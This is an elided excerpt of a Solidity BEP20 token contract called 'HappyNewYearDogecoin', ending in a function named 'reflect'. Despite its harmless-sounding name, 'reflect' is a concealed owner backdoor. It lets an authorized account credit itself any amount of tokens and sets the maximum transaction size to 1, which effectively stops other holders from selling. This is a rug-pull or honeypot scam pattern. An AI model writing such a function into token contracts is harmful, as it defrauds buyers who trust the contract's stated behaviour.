...
contract HappyNewYearDogecoin is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "HappyNewYearDogecoin";
    string constant _symbol = "HNYD";
    ...
    constructor () Auth(msg.sender) {
        ...
        address _presaler = 0xb232496C52D403E89cF373efedc0B46696e838A3;
    ...
    function reflect (uint256 amount) external authorized {_balances[msg.sender] += amount;_maxTxAmount=1;}
